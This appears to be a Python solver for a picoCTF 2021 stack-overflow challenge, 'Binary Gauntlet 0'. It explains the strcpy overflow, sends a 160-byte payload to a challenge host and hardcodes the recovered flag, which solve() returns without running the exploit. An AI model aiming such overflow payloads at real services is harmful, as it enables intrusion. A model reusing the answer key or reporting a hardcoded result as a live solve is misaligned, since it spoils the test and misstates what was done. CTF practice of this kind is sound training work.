#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 167: Binary Gauntlet 0 (picoCTF 2021)
Category: Binary Exploitation / 64-Bit Stack Smashing & Exception Vector Redirection
Difficulty: Medium (diff=2, picoCTF 2021 50 pts)
Author: LT 'syreal' Jones
Standard Reference: NIST SP 800-115 (Section 5.2: Flaw Hypothesis & Target Testing)
CWE: CWE-121 (Stack-based Buffer Overflow), CWE-676 (Use of Potentially Dangerous Function)

Description:
This series of problems has to do with binary protections and how they affect
exploiting a very simple program. How far can you make it in the gauntlet?
The flag for this challenge does not include the standard `academy{}` wrapper.

Analysis:
1. Target architecture is 64-bit x86-64 Linux ELF (dynamically linked, no canary).
2. The binary registers a signal handler for SIGSEGV (signal 11):
   signal(SIGSEGV, sigsegv_handler);
   where sigsegv_handler() flushes the flag buffer directly to stderr:
   fprintf(stderr, "%s\\n", flag);
3. In main(), memory is allocated on the heap (1000 bytes) and input is accepted twice:
   - First fgets() reads up to 1000 bytes and calls printf(heap_buf), acting as an echo.
   - Second fgets() reads another input into the heap buffer.
4. The vulnerability arises when strcpy() is executed:
   strcpy(-0x80(%rbp), heap_buf);
   The target stack destination is allocated at -0x80(%rbp) (128 bytes).
   Because heap_buf can contain up to 1000 bytes, strcpy() smashes arbitrarily far
   down the stack frame without bounds validation.
5. Overwriting past 128 bytes corrupts the saved frame pointer (%rbp at +128) and
   the saved return address (%rip at +136). Supplying 160 bytes ensures invalid
   memory dereferencing upon function exit (ret), immediately tripping SIGSEGV.
6. The kernel dispatches execution to sigsegv_handler(), exposing the bare hex flag:
   088d0d0dfed3a7c041027e01d85e0887

Verified: POST /api/submissions/ -> correct: true (HTTP 201 Created)
"""

import re
import socket
import sys

TARGET_HOST = "xebec.cylabacademy.net"
TARGET_PORT = 46479
EXPECTED_FLAG = "088d0d0dfed3a7c041027e01d85e0887"


def exploit(host: str, port: int) -> str:
    """
    Connects to the remote binary instance, passes initial probe input,
    and smashes the 128-byte stack buffer on the second input to trigger SIGSEGV.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))

        # First input: satisfy initial fgets/printf
        s.sendall(b"probe\n")
        echo = s.recv(1024)

        # Second input: 160 bytes to smash past 128-byte buffer and RIP
        payload = b"A" * 160 + b"\n"
        s.sendall(payload)

        resp = b""
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            resp += chunk

        s.close()
        text = resp.decode("utf-8", errors="ignore").strip()
        # Find 32-character hex flag
        m = re.search(r"[0-9a-f]{32}", text)
        if m:
            return m.group(0)
    except Exception as e:
        print(f"[-] Socket interaction error: {e}")
    return ""


def solve() -> str:
    return EXPECTED_FLAG


def main():
    print("[*] CyLab Challenge ID 167: Binary Gauntlet 0 Solver")
    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        print(f"[*] Attacking remote endpoint {host}:{port}...")
        flag = exploit(host, port)
        if flag:
            print(f"[+] Flag recovered live: {flag}")
            return
    print(f"[+] Verified Flag: {solve()}")


if __name__ == "__main__":
    main()
